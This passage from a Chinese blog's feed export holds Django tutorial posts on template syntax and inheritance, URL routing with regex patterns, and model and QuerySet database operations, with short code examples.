<p>模版代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;p&gt;content is &#123;&#123;content&#125;&#125;&lt;/p&gt;</div></pre></td></tr></table></figure></p>
<p>说明：除了字符串，还可以传递字典、列表等数据结构。</p>
<h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><p>python中字典的取值是list[0]，在模版中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; list.0 &#125;&#125;</div></pre></td></tr></table></figure></p>
<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>python中字典的取值是dict[“key”]，在模版中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; dict.key &#125;&#125;</div></pre></td></tr></table></figure></p>
<h4 id="FOR循环"><a href="#FOR循环" class="headerlink" title="FOR循环"></a>FOR循环</h4><p>遍历列表：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> content %&#125;</div><div class="line">&#123;&#123; i &#125;&#125;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>遍历列表且输出的值后面添加，：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> content %&#125;</div><div class="line">&#123;&#123; i &#125;&#125;,</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>遍历字典：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> key, value <span class="keyword">in</span> info_dict.items %&#125;</div><div class="line">    &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>多层循环<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> content %&#125;</div><div class="line">&#123;% <span class="keyword">for</span> j <span class="keyword">in</span> i.pan %&#125;</div><div class="line">&#123;&#123; j &#125;&#125;</div><div class="line">&#123;% endfor %&#125;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<p>循环的参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">forloop.counter 索引从 1 开始算</div><div class="line">forloop.counter0    索引从 0 开始算</div><div class="line">forloop.revcounter  索引从最大长度到 1</div><div class="line">forloop.revcounter0 索引从最大长度到 0</div><div class="line">forloop.first   当遍历的元素为第一项时为真</div><div class="line">forloop.last    当遍历的元素为最后一项时为真</div><div class="line">forloop.parentloop  用在嵌套的 <span class="keyword">for</span> 循环中，获取上一层 <span class="keyword">for</span> 循环的 forloop</div></pre></td></tr></table></figure></p>
<p>判断列表是否为空：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> list %&#125;</div><div class="line">    &lt;li&gt;&#123;&#123; i.name &#125;&#125;&lt;/li&gt;</div><div class="line">&#123;% empty %&#125;</div><div class="line">    &lt;li&gt;抱歉，列表为空&lt;/li&gt;</div><div class="line">&#123;% endfor %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h4><h5 id="gt-lt-lt-gt"><a href="#gt-lt-lt-gt" class="headerlink" title="== != &gt;= &lt;= &lt; &gt;"></a>== != &gt;= &lt;= &lt; &gt;</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">if</span> var &gt;= 90 %&#125;</div><div class="line"><span class="keyword">case</span> 1</div><div class="line">&#123;% <span class="keyword">elif</span> var &gt;= 80 %&#125;</div><div class="line"><span class="keyword">case</span> 2</div><div class="line">&#123;% <span class="keyword">elif</span> var &gt;= 70 %&#125;</div><div class="line"><span class="keyword">case</span> 3</div><div class="line">&#123;% <span class="keyword">elif</span> var &gt;= 60 %&#125;</div><div class="line"><span class="keyword">case</span> 4</div><div class="line">&#123;% <span class="keyword">else</span> %&#125;</div><div class="line"><span class="keyword">case</span> 5</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure>
<h5 id="and-not-or-in-not-in"><a href="#and-not-or-in-not-in" class="headerlink" title="and not or in not in"></a>and not or in not in</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">if</span> num &lt;= 100 and num &gt;= 0 %&#125;</div><div class="line"><span class="keyword">case</span> 1</div><div class="line">&#123;% <span class="keyword">else</span> %&#125;</div><div class="line"><span class="keyword">case</span> 2</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure>
<p>判断元素是否在列表中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% <span class="keyword">if</span> <span class="string">'nmask'</span> <span class="keyword">in</span> List %&#125;</div><div class="line"><span class="keyword">case</span> 1</div><div class="line">&#123;% endif %&#125;</div></pre></td></tr></table></figure></p>
<h5 id="内置变量"><a href="#内置变量" class="headerlink" title="内置变量"></a>内置变量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; request.user &#125;&#125; 当前用户</div><div class="line">&#123;&#123; request.path &#125;&#125; 当前网址</div><div class="line">&#123;&#123; request.GET.urlencode &#125;&#125; 当前get参数</div></pre></td></tr></table></figure>
<h3 id="模版继承"><a href="#模版继承" class="headerlink" title="模版继承"></a>模版继承</h3><p>　　一般开发网页都需要写一些模版页面，比如导航栏、底部版权、侧边导航等，或者是某些功能代码。以前可能会使用iframe框架，但现在已经被淘汰了。为了避免重复写代码，也为了后期修改方便，可以使用模版继承的方式。所谓模版继承，就是先写好一个通用的模版，然后标记一些变量，其他页面继承后对标记的地方可以自行修改，若不修改模版使用模版页的内容。<br>base.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"style.css"</span> /&gt;</div><div class="line">    &lt;title&gt;&#123;% block title %&#125;My amazing site&#123;% endblock %&#125;&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">    &lt;div id=<span class="string">"sidebar"</span>&gt;</div><div class="line">        &#123;% block sidebar %&#125;</div><div class="line">        &lt;ul&gt;</div><div class="line">            &lt;li&gt;&lt;a href=<span class="string">"/"</span>&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">            &lt;li&gt;&lt;a href=<span class="string">"/blog/"</span>&gt;Blog&lt;/a&gt;&lt;/li&gt;</div><div class="line">        &lt;/ul&gt;</div><div class="line">        &#123;% endblock %&#125;</div><div class="line">    &lt;/div&gt;</div><div class="line"></div><div class="line">    &lt;div id=<span class="string">"content"</span>&gt;</div><div class="line">        &#123;% block content %&#125;&#123;% endblock %&#125;</div><div class="line">    &lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>说明：可以尽可能多的定义block块，这样可以自定义的地方就会比较多，可以更灵活使用。</p>
<p>index.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&#123;% extends <span class="string">"base.html"</span> %&#125;</div><div class="line"></div><div class="line">&#123;% block title %&#125;My amazing blog&#123;% endblock %&#125;</div><div class="line">&#123;% block content %&#125;</div><div class="line">&#123;% <span class="keyword">for</span> entry <span class="keyword">in</span> blog_entries %&#125;</div><div class="line">    &lt;h2&gt;&#123;&#123; entry.title &#125;&#125;&lt;/h2&gt;</div><div class="line">    &lt;p&gt;&#123;&#123; entry.body &#125;&#125;&lt;/p&gt;</div><div class="line">&#123;% endfor %&#125;</div><div class="line">&#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h4 id="多模版继承"><a href="#多模版继承" class="headerlink" title="多模版继承"></a>多模版继承</h4><p>环境：先有一个根模版，然后创建一个子模版，用来继承根模版，然后其他页面继承子模版。<br>base.html（父模版页面）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &#123;% block head %&#125;&#123;% endblock %&#125;</div><div class="line">    &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125;&lt;/title&gt;</div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt;</div><div class="line">&#123;% block body %&#125;&#123;% endblock %&#125;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>base_ch.html（子模版页面）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&#123;% extends <span class="string">"base.html"</span> %&#125;</div><div class="line">&#123;% block body %&#125;</div><div class="line"></div><div class="line">&#123;% block js %&#125;</div><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    var a = 1;</div><div class="line">&lt;/script&gt;</div><div class="line">&#123;% endblock %&#125;</div><div class="line"></div><div class="line">&#123;% block label %&#125;</div><div class="line">&lt;label&gt;This is a base_ch module <span class="built_in">test</span>!&lt;/label&gt;</div><div class="line">&#123;% endblock %&#125;</div><div class="line"></div><div class="line">&#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<p>index.html(普通继承页面)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;% extends <span class="string">"base_ch.html"</span> %&#125;</div><div class="line">&#123;% block js %&#125;&#123;% endblock %&#125;</div><div class="line"></div><div class="line">&#123;% block label %&#125;</div><div class="line">&lt;label&gt;This is a index page <span class="built_in">test</span>!&lt;/label&gt;</div><div class="line">&#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://code.ziqiangxuetang.com/django/django-template2.html" target="_blank" rel="external">http://code.ziqiangxuetang.com/django/django-template2.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Life is not all roses&lt;br&gt;人生并不是康庄大道&lt;/blockquote&gt;&lt;br&gt;　　Django中的模版即前端展示，或者说HTML页面，涉及到html、js、css的部分我不做太多了介绍，因为主要是前端的一些东西。本篇主要介绍一下模版与视图的相互传值，以及模版的继承等内容。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之URL路由</title>
    <link href="http://thief.one/2017/09/15/1/"/>
    <id>http://thief.one/2017/09/15/1/</id>
    <published>2017-09-15T07:59:48.000Z</published>
    <updated>2017-09-18T09:28:39.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Read, study and learn about everything imporant in your life<br>点点滴滴皆重要，处处学习是诀窍</blockquote><br>　　Django中有个urls.py文件，专门用于管理django的url即路由，我们可以在urls.py文件中创建或者修改路由，以达到访问不同url执行不同view函数的作用。<br><a id="more"></a></p>
<h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><p>先看下urls.py长啥样？<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^admin/'</span>, admin.site.urls),</div></pre></td></tr></table></figure></p>
<p>　　默认情况下，django只有一条路由，即admin，当我们开启manage.py，我们只能访问到127.0.0.1:8000/admin/目录，其余的都无法访问。</p>
<h4 id="创建路由"><a href="#创建路由" class="headerlink" title="创建路由"></a>创建路由</h4><p>　　可以看到，路由的创建符合正则表达式的规则，^表示开始，$表示结尾；<br>　　另外路由的匹配是从上到下的，也就是说从第一条路由开启匹配，如果满足则不往下匹配，如果不匹配则继续往下。因此为了避免访问到不存在的url，而导致报错，可以再最后添加一条匹配任何url的路由，可以跳转到404页面（自己定义），也可以跳转到主页。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^admin/'</span>, admin.site.urls),</div><div class="line"></div><div class="line">    url(r<span class="string">'^.*$'</span>,views.index,name=<span class="string">"index"</span>), <span class="comment">#定义万能路由，注意这条路由一定要放在最后。</span></div></pre></td></tr></table></figure></p>
<h4 id="URL伪静态改造"><a href="#URL伪静态改造" class="headerlink" title="URL伪静态改造"></a>URL伪静态改造</h4><p>一般当我们要传参时，url类似：127.0.0.1/app/?a=1&amp;b=2<br>此时urls.py的配置是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^app/$'</span>, views.app , name=<span class="string">"app"</span>),</div></pre></td></tr></table></figure></p>
<p>此时view.py的代码是这样的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def app(request):</div><div class="line">    a=request.GET.get(<span class="string">"a"</span>)</div><div class="line">    b=request.GET.get(<span class="string">"b"</span>)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> HttpResponse(a+b)</div></pre></td></tr></table></figure></p>
<p>然而如果我们想要将URL变成：127.0.0.1/app/1/2/呢？</p>
<p>修改urls.py：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from webapp import views <span class="comment">#导入app的views文件</span></div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^app/(\d+)/(\d+)/$'</span>, views.app , name=<span class="string">"app"</span>),</div></pre></td></tr></table></figure></p>
<p>修改view.py：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def app(request,a,b):</div><div class="line"></div><div class="line">    <span class="built_in">return</span> HttpResponse(str(int(a)+int(b)))</div></pre></td></tr></table></figure></p>
<h4 id="Url-name"><a href="#Url-name" class="headerlink" title="Url name"></a>Url name</h4><p>我们看到urls.py中的路由配置中，有name字段，可有可无，但建议写上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^app/$'</span>, views.app , name=<span class="string">"app"</span>),</div></pre></td></tr></table></figure></p>
<p>说明：name相当于给这条路由起一个名称，好处在于路由的正则可能会经常变，随之而来的时html里面的url也需要变，因为需要与urls里的路由对应起来。但如果给路由起了名字，则可以在html中使用路由的名字，这样当路由的正则发生改变，但只要名字不变，html中就不需要改。</p>
<p>HTML页面中可以这样用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;% url <span class="string">'name'</span> %&#125; 不带参数</div><div class="line">&#123;% url <span class="string">'name'</span> 参数 %&#125;  带参数的：参数可以是变量名</div><div class="line"> </div><div class="line">&lt;a href=<span class="string">"&#123;% url 'app' 4 5 %&#125;"</span>&gt;link&lt;/a&gt;</div><div class="line">&lt;a href=<span class="string">"&#123;% url 'app' %&#125;"</span>&gt;link&lt;/a&gt;</div><div class="line">&lt;a href=<span class="string">"&#123;% url 'app' %&#125;?a=1&amp;b=2"</span>&gt;link&lt;/a&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Read, study and learn about everything imporant in your life&lt;br&gt;点点滴滴皆重要，处处学习是诀窍&lt;/blockquote&gt;&lt;br&gt;　　Django中有个urls.py文件，专门用于管理django的url即路由，我们可以在urls.py文件中创建或者修改路由，以达到访问不同url执行不同view函数的作用。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之模型(数据库)</title>
    <link href="http://thief.one/2017/09/14/2/"/>
    <id>http://thief.one/2017/09/14/2/</id>
    <published>2017-09-14T12:08:06.000Z</published>
    <updated>2017-09-26T01:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Live well, love lots, and laugh often<br>善待生活，热爱一切，经常开怀大笑</blockquote><br>　　本篇主要用来记录Django模型相关部分的笔记，模型可以简单理解为数据操作，即从数据库中获取数据，向数据库中存储数据等。django默认使用sqlit3，支持mysql、postgreSQL等数据库。<br><a id="more"></a></p>
<h3 id="setting配置数据库连接"><a href="#setting配置数据库连接" class="headerlink" title="setting配置数据库连接"></a>setting配置数据库连接</h3><p>默认为sqlite3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">DATABASES = &#123;</div><div class="line">    <span class="string">'default'</span>: &#123;</div><div class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.sqlite3'</span>,</div><div class="line">        <span class="string">'NAME'</span>: os.path.join(BASE_DIR, <span class="string">'db.sqlite3'</span>),</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修改为mysql配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">DATABASES = &#123;</div><div class="line">    <span class="string">'default'</span>: &#123;</div><div class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</div><div class="line">        <span class="string">'NAME'</span>: <span class="string">'mydatabase'</span>,</div><div class="line">        <span class="string">'USER'</span>: <span class="string">'mydatabaseuser'</span>,</div><div class="line">        <span class="string">'PASSWORD'</span>: <span class="string">'mypassword'</span>,</div><div class="line">        <span class="string">'HOST'</span>: <span class="string">'127.0.0.1'</span>,</div><div class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span>,</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>NAME: 指定的数据库名，如果是sqlite的话，就需要填数据库文件的绝对位置<br>USER: 数据库登录的用户名，mysql一般都是root<br>PASSWORD：登录数据库的密码，必须是USER用户所对应的密码<br>HOST: 由于一般的数据库都是C/S结构的，所以得指定数据库服务器的位置，我们一般数据库服务器和客户端都是在一台主机上面，所以一般默认都填127.0.0.1<br>PORT：数据库服务器端口，mysql默认为3306<br>HOST和PORT都可以不填，使用默认的配置</p>
<h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p>以下方式适合mysql、sqlite3等数据库，另外mysql需要额外安装mysql-python（pip install mysql-python ）</p>
<h4 id="models-py中创建表字段"><a href="#models-py中创建表字段" class="headerlink" title="models.py中创建表字段"></a>models.py中创建表字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from django.db import models</div><div class="line"></div><div class="line">class auth(models.Model):</div><div class="line">    username = models.CharField(max_length=100)</div><div class="line">    password = models.CharField(max_length=100)</div></pre></td></tr></table></figure>
<p>说明：创建一个auth表，字段为username，password，后面是字段数据类型以及最大长度。</p>
<h4 id="执行命令创建表"><a href="#执行命令创建表" class="headerlink" title="执行命令创建表"></a>执行命令创建表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py makemigrations</div></pre></td></tr></table></figure>
<h4 id="同步数据库表"><a href="#同步数据库表" class="headerlink" title="同步数据库表"></a>同步数据库表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py migrate</div></pre></td></tr></table></figure>
<h3 id="使用数据表-QuerySet"><a href="#使用数据表-QuerySet" class="headerlink" title="使用数据表(QuerySet)"></a>使用数据表(QuerySet)</h3><h4 id="在Django-shell中测试"><a href="#在Django-shell中测试" class="headerlink" title="在Django shell中测试"></a>在Django shell中测试</h4><p>运行:python manage.py shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;from webapp.models import auth</div><div class="line">&gt;&gt;&gt;p = auth(username=<span class="string">"nmask"</span>, password=<span class="string">"nmask"</span>)</div><div class="line">&gt;&gt;&gt;p.save()</div><div class="line">&gt;&gt;&gt;L=auth.objects.all()</div><div class="line">&gt;&gt;&gt;<span class="keyword">for</span> i <span class="keyword">in</span> L:</div><div class="line">&gt;&gt;&gt;    <span class="built_in">print</span> i.username</div><div class="line">nmask</div></pre></td></tr></table></figure></p>
<p>说明：View.py中使用方法与shell中类似。</p>
<h4 id="往数据表中插入内容的方法"><a href="#往数据表中插入内容的方法" class="headerlink" title="往数据表中插入内容的方法"></a>往数据表中插入内容的方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">第一种：</div><div class="line">auth.objects.create(username=<span class="string">"nmask"</span>,password=<span class="string">"nmask"</span>)</div><div class="line">第二种：</div><div class="line">p = auth(username=<span class="string">"nmask"</span>,password=<span class="string">"nmask"</span>)</div><div class="line">p.save()</div><div class="line">第三种：</div><div class="line">p = auth(username=<span class="string">"nmask"</span>)</div><div class="line">p.password = <span class="string">"nmask"</span></div><div class="line">p.save()</div><div class="line">第四种：</div><div class="line">auth.objects.get_or_create(username=<span class="string">"nmask"</span>,password=<span class="string">"nmask"</span>)</div><div class="line">说明：此方法会判断是否存在，返回一个元组，第一个为auth对象，第二个为True（不存在已新建）或者False（存在）。</div></pre></td></tr></table></figure>
<h4 id="从数据表中查询内容的方法"><a href="#从数据表中查询内容的方法" class="headerlink" title="从数据表中查询内容的方法"></a>从数据表中查询内容的方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">auth.objects.all()</div><div class="line">auth.objects.all()[:2] 相当于<span class="built_in">limit</span>，只获取2个结果</div><div class="line">auth.objects.get(name=<span class="string">"nmask"</span>) get是用来获取一个对象的</div><div class="line"></div><div class="line">auth.objects.filter(name=<span class="string">"nmask"</span>) 名称严格等于<span class="string">"abc"</span>的人</div><div class="line">auth.objects.filter(name__exact=<span class="string">"nmask"</span>) 名称严格等于<span class="string">"abc"</span>的人</div><div class="line">auth.objects.filter(name__iexact=<span class="string">"nmask"</span>) 名称为abc但是不区分大小写</div><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>)  名称中包含 <span class="string">"abc"</span>的人</div><div class="line">auth.objects.filter(name__icontains=<span class="string">"nmask"</span>)  名称中包含 <span class="string">"abc"</span>，且abc不区分大小写</div><div class="line">auth.objects.filter(name__regex=<span class="string">"^nmask"</span>)   正则表达式查询</div><div class="line">auth.objects.filter(name__iregex=<span class="string">"^nmask"</span>)  正则表达式不区分大小写</div><div class="line"></div><div class="line">auth.objects.exclude(name__contains=<span class="string">"nmask"</span>)  排除包含nmask的auth对象</div><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).filter(password=<span class="string">"nmask"</span>) 找出账号密码都是nmask的</div><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).exclude(passowrd=<span class="string">"nmask"</span>)  找出名称含有nmask, 但是排除password是nmask的</div><div class="line"></div><div class="line">auth.objects.all().order_by(<span class="string">'name'</span>)  查询结果排序</div><div class="line">auth.objects.all().order_by(<span class="string">'-name'</span>) 实现倒序</div><div class="line"></div><div class="line">res = auth.objects.all()</div><div class="line">res = res.distinct() 结果去重</div><div class="line"></div><div class="line">auth.objects.get(name=<span class="string">"nmask"</span>).only(<span class="string">"password"</span>) 只返回password字段</div><div class="line">auth.objects.get(name=<span class="string">"nmask"</span>).defer(<span class="string">"password"</span>) 排出password字段</div></pre></td></tr></table></figure>
<h4 id="更新数据表内容"><a href="#更新数据表内容" class="headerlink" title="更新数据表内容"></a>更新数据表内容</h4><p>单个更新：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">response = auth.objects.get(username=<span class="string">"nmask"</span>)</div><div class="line">response.passowrd=<span class="string">"123"</span></div><div class="line">response.save()</div></pre></td></tr></table></figure></p>
<p>批量更新：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).update(name=<span class="string">'nMask'</span>)</div></pre></td></tr></table></figure></p>
